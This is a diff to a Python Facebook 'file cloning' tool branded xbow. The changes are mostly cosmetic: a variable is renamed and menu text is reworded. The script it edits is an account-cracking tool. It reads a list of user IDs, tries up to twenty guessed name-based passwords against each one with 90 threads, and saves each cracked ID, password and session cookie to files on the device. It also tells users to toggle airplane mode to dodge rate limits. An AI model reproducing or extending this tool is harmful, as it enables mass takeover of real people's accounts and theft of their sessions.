@@ -141,7 +141,7 @@ G = '\x1b[38;5;48m'
 orange = "\x1b[38;5;196m"
 yellow = "\x1b[38;5;208m"
 black = "\033[1;30m"
-rad = "\x1b[38;5;160m"
+red = "\x1b[38;5;160m"
 green = "\x1b[38;5;46m"
 yelloww = "\033[1;33m"
 blue = "\033[38;5;6m"
@@ -172,7 +172,7 @@ logo = f"""
 {white}X   X BBBB   OOO    W W
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {white}[{green}◆{white}] {white}FACEBOOK  {white} 
-{white}[{green}◆{white}] {white}TOOL  {white}➣{green}  FREE{white}{rad}┼{faltu}{rad}FILE Cloning{pvt}{green}{rad}┼ 
+{white}[{green}◆{white}] {white}TOOL  {white}➣{green}  FREE{white}{red}┼{faltu}{red}FILE Cloning{pvt}{green}{red}┼ 
 {white}[{green}◆{white}] {white}GITHUB    {white}➣{white}   ({gren}xbow-570{white})
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
@@ -181,48 +181,50 @@ logo = f"""
 def result(OKs, cps):
     if len(OKs) != 0 or len(cps) != 0:
         print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
-        print(f'{rad}[{white}◆{rad}] {green}THE PROCESS HAS BEEN COMPLETED...')
-        print(f'{rad}[{white}◆{rad}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
-        print(f'{rad}[{white}◆{rad}] {green}TOTAL CP {white}➣{rad} %s' % str(len(cps)))
+        print(f'{red}[{white}◆{red}] {green}THE PROCESS HAS BEEN COMPLETED...')
+        print(f'{red}[{white}◆{red}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
+        print(f'{red}[{white}◆{red}] {green}TOTAL CP {white}➣{red} %s' % str(len(cps)))
         print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
-        input(f"{rad}[{white}◆{rad}] {green}PRESS ENTER TO BACK MENU ")
+        input(f"{red}[{white}◆{red}] {green}PRESS ENTER TO BACK MENU ")
         exit()
 
 
 # __________________[ MENU ]__________________#
 def menu():
     clear()
-    print(f'{rad}[{white}1{rad}] {green}START FILE CLONE')
-    print(f'{rad}[{white}3{rad}] {green}JOIN WHATSAPP GROUP')
-    print(f'{rad}[{white}4{rad}] {green}CONTACT TOOL ADMIN')
-    print(f'{rad}[{white}0{rad}] {gren}EXIT MENU  ')
+    print(f'[{white}1] {green}START FILE CLONE{white}')
+    print(f'[{white}2] JOIN WHATSAPP GROUP')
+    print(f'[{white}3] CONTACT TOOL ADMIN')
+    print(f'[{white}0] {red}EXIT TOOL  ')
     linex()
-    select = input(f'{rad}[{white}◆{rad}] {green}CHOICE OPTION {white}➣{green} ')
+    select = input(f'{white}[{green}◆{white}] {white}CHOICE OPTION {white}➣{green} ')
     if select == '1':
         _file_()
     elif select == '2':
-        _file_()
-    elif select == '3':
-        os.system('xdg-open https://chat.whatsapp.com/Bd8RQc6VoKxLOO9ljc5Raj');
+        print(f'{red}Not Found{red}')
+        time.sleep(2)
+        #os.system('xdg-open https://chat.whatsapp.com/Bd8RQc6VoKxLOO9ljc5Raj');
         menu()
-    elif select == '4':
-        os.system('xdg-open https://www.facebook.com/MR.xbow.404');
+    elif select == '3':
+        print(f'{red}Not Found{red}')
+        time.sleep(2)
+        #os.system('xdg-open https://www.facebook.com/MR.xbow.404');
         menu()
     elif select == '0':
-        exit(f'{green}[{rad}+{green}] SUCCESSFULLY EXIT DONE ')
+        exit(f'{green}[{red}+{green}] See you again ')
     else:
-        print(f'{G1}[{A}={G2}]{G2} INVALID OPTION')
-        time.sleep(2)
+        print(f'{red} INVALID OPTION')
+        time.sleep(1)
         menu()
 
 
 def _file_():
     global methods
     clear()
-    print(f'{rad}[{white}◆{rad}] {green}METHOD - 1')
-    print(f'{rad}[{white}◆{rad}] {green}METHOD - 2')
+    print(f'{white}[{red}◆{white}] {white}METHOD - 1')
+    print(f'{white}[{green}◆{white}] {white}METHOD - 2')
     linex()
-    option = input(f'{rad}[{white}◆{rad}] {green} CHOICE OPTION {rad}➣{green} ')
+    option = input(f'{white}[{green}◆{white}] {white}CHOICE OPTION {white}➣{green} ')
     if option == '1':
         methods.append('methodA')
         main_crack().crack(id)
@@ -235,7 +237,7 @@ def _file_():
     elif option == '0':
         _file_()
     else:
-        print(f'{green}[{rad}+{green}] INVALID OPTION')
+        print(f'{green}[{red}+{green}] INVALID OPTION')
         time.sleep(2)
         _file_()
 
@@ -247,18 +249,18 @@ class main_crack():
     def crack(self, id):
         global methods
         clear()
-        print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} /sdcard/xbow.txt');
+        print(f'{white}[{green}◆{white}] {white}Input File Path e.g. "/sdcard/1.txt"');
         linex()
-        self.file = input(f'{rad}[{white}◆{rad}]{green} FILE NAME {rad}➣{green} ')
+        self.file = input(f'{white}[{green}◆{white}]{white} File Path {white}➣{white} ')
         try:
             self.id = open(self.file).read().splitlines()
             self.pasw()
         except FileNotFoundError:
-            print(f'{green}[{rad}+{green}] OPPS FILE NOT FOUND ...')
+            print(f'{red}[{red}+{red}] File Not Found ...')
             time.sleep(1)
             os.system('clear')
             print(logo)
-            print(f'{green}[{rad}+{green}] TRY AGAIN ...')
+            print(f'{red}[{red}+{red}] Input Correct File Path')
             time.sleep(1)
             main_crack().crack(id)
 
@@ -267,7 +269,7 @@ class main_crack():
         try:
             global oks, cps, loop
             sys.stdout.write(
-                f"\r{rad}[{green}xbow-M1{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ")
+                f"\r{red}[{green}xbow-M1{red}]{white}-{red}[{gren}{loop}{red}]{white}-{red}[{green}OK{red}]{white}-{red}[{green}{len(oks)}{red}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -322,8 +324,8 @@ class main_crack():
                     AJb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/",
                                                                                                                "-");
                     cookie = f"{ckkk}"
-                    print(f"\r\r{rad}[{green}xbow-OK{rad}] {green}{sid} {rad}-{green} {ps} ")
-                    print(f'\r\r{green}-[💉]-{white} {cookie}''\n')
+                    print(f"\r\r{red}[{green}xbow-OK{red}] {green}{sid} {red}-{green} {ps} ")
+                    print(f'\r\r{green}-[🤡]-{white} {cookie}''\n')
                     open('/sdcard/xbow-M1-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                     oks.append(sid)
                     break
@@ -342,7 +344,7 @@ class main_crack():
         try:
             global oks, cps, loop
             sys.stdout.write(
-                f"\r{rad}[{green}xbow-M2{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ")
+                f"\r{red}[{green}xbow-M2{red}]{white}-{red}[{gren}{loop}{red}]{white}-{red}[{green}OK{red}]{white}-{red}[{green}{len(oks)}{red}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -397,8 +399,8 @@ class main_crack():
                     SMILEb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/",
                                                                                                                   "-");
                     cookie = f"{ckkk}"
-                    print(f"\r\r{rad}[{green}xbow-OK{rad}] {green}{sid} {rad}-{green} {ps} ")
-                    print(f'\r\r{green}-[💉]-{white} {cookie}''\n')
+                    print(f"\r\r{red}[{green}xbow-OK{red}] {green}{sid} {red}-{green} {ps} ")
+                    print(f'\r\r{green}-[🤡]-{white} {cookie}''\n')
                     open('/sdcard/xbow-M2-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                     oks.append(sid)
                     break
@@ -418,22 +420,22 @@ class main_crack():
     def pasw(self):
         pw = []
         clear()
-        print(f'{rad}[{white}◆{rad}] {green}PASSWORD LIMIT SHOULD NOT BE GREATER THAN 20');
+        print(f'{white}[{red}◆{white}] {red}Password Limit Should Be Not Greater Than 20!');
         linex()
-        sl = int(input(f'{rad}[{white}◆{rad}] {green}PASSWORD LIMIT {rad}➣{green} '))
+        sl = int(input(f'{white}[{green}◆{white}] {white}Input Password Limit {green}➣{green} '))
         clear()
-        print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} first123/firstlast/first@@@')
+        print(f'{white}[{green}◆{white}] {white}EXAMPLE {white}➣{white} First123/first12/77889900')
         linex()
         if sl == '':
             print(f'{S}[{R}={G5}]{S} PUT LIMIT BETWEEN 1 TO 20')
         elif sl > 20:
-            print(f'{G5}[{R}={G5}]{S} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 20')
+            print(f'{G5}[{R}={G5}]{S} Password Limit Should Be Not Greater Than 20!')
         else:
             for sr in range(sl):
-                pw.append(input(f'{rad}[{white}◆{rad}] {green}PASSWORD NO {white}{sr + 1} {rad}➣{green} '))
+                pw.append(input(f'{white}[{green}◆{white}] {white}Password {white}{sr + 1} {white}➣{white} '))
         clear()
-        print(f'{rad}[{white}◆{rad}] {green}TOTAL UID  {white}➣{gren} %s ' % len(self.id))
-        print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT {rad}({white}ON{green}/{white}OF{rad}){green} AIRPLAN MOOD')
+        print(f'{white}[{green}◆{white}] {white}TOTAL UID  {white}➣{white} %s ' % len(self.id))
+        print(f'{white}[{green}◆{white}] {white}Use Automate 1M/3S Airplane Flow')
         linex()
         with Habib(max_workers=90) as AJworld:
             for zsb in self.id:
